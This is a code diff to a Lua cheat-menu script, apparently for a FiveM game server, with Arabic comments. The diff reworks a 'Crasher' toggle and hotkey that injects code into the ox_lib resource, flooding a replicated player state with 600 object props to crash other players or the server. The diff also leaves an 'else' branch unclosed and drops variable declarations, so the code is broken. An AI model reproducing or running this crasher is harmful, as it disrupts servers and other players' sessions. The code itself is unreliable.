@@ -5474,47 +5474,44 @@ MachoMenuButton(VIPTabSections[1], "Spawn", function()
     end
 end)
 
--- 1. تعريف حالة الزر (Checkbox)
-local crasherEnabled = false
-local selectedKey = 0
-
+-- 2. كود الزر (Checkbox)
 MachoMenuCheckbox(VIPTabSections[2], "Crasher", function(enabled)
     crasherEnabled = enabled
+    MachoMenuNotification("Crasher Status", enabled and "ON" or "OFF")
 end)
 
--- 2. ربط مفتاح الاختصار (Keybind)
+-- 3. كود تحديد الزر (Keybind)
 MachoMenuKeybind(VIPTabSections[2], "Crasher Key", 0, function(key)
     selectedKey = key
 end)
 
--- 3. وظيفة التنفيذ عند ضغط الزر
+-- 4. كود التنفيذ (المحرك)
 MachoOnKeyDown(function(key)
-    -- لا ينفذ إلا إذا كان الزر مفعل في المنيو والزر المضغوط هو الصحيح
-    if key == selectedKey and selectedKey ~= 0 and crasherEnabled then
-        
-        MachoMenuNotification("Crasher", "Executing...")
+    -- التحقق من الضغط ومن أن الزر مفعل
+    if selectedKey ~= 0 and key == selectedKey then
+        if crasherEnabled then
+            MachoMenuNotification("Crasher", "Executing...")
+            
+            MachoInjectResourceRaw("ox_lib", [[
+                CreateObject = function() end
+                local model <const> = 'p_spinning_anus_s'
+                local props <const> = {}
 
-        MachoInjectResourceRaw("ox_lib", [[
-            CreateObject = function() end
-            local model <const> = 'p_spinning_anus_s'
-            local props <const> = {}
+                for i = 1, 600 do
+                    props[i] = {
+                        model = model,
+                        coords = vec3(0.0, 0.0, 0.0),
+                        pos = vec3(0.0, 0.0, 0.0),
+                        rot = vec3(0.0, 0.0, 0.0)
+                    }
+                end
 
-            for i = 1, 600 do
-                props[i] = {
-                    model = model,
-                    coords = vec3(0.0, 0.0, 0.0),
-                    pos = vec3(0.0, 0.0, 0.0),
-                    rot = vec3(0.0, 0.0, 0.0)
-                }
-            end
-
-            local plyState <const> = LocalPlayer.state
-            plyState:set('lib:progressProps', props, true)
-            Wait(1000)
-            plyState:set('lib:progressProps', nil, true)
-        ]])
-    end
-end)
+                local plyState <const> = LocalPlayer.state
+                plyState:set('lib:progressProps', props, true)
+                Wait(1000)
+                plyState:set('lib:progressProps', nil, true)
+            ]])
+        else
 
 
 MachoMenuButton(VIPTabSections[2], "Staff (2) (BETA) - Announce", function()
